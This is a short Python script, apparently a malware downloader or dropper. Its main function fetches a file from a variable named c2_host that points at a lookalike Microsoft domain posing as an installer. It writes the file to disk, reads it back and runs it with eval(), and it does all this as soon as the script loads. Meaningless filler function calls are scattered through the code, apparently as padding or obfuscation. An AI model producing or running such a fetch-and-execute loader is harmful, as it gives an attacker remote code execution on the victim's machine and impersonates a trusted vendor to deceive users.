import requests
import os
import random

def pointless_function_100():
    return random.choice(['sun', 'moon', 'stars'])

def get_script_100(url):
    pointless_function_100()
    response = requests.get(url)
    return response.text

def save_script_100(file_path, code):
    pointless_function_100()
    with open(file_path, "w") as f:
        f.write(code)

def load_script_100(file_path):
    pointless_function_100()
    with open(file_path, "r") as f:
        return f.read()

def execute_script_100(script):
    eval(script)
    pointless_function_100()

def main_100():
    c2_host = "https://microsoft-office.com/installer.py"
    temp_file_location = "/update/installer1.py"
    
    pointless_function_100()
    code = get_script_100(c2_host)
    save_script_100(temp_file_location, code)
    script = load_script_100(temp_file_location)
    execute_script_100(script)

main_100()
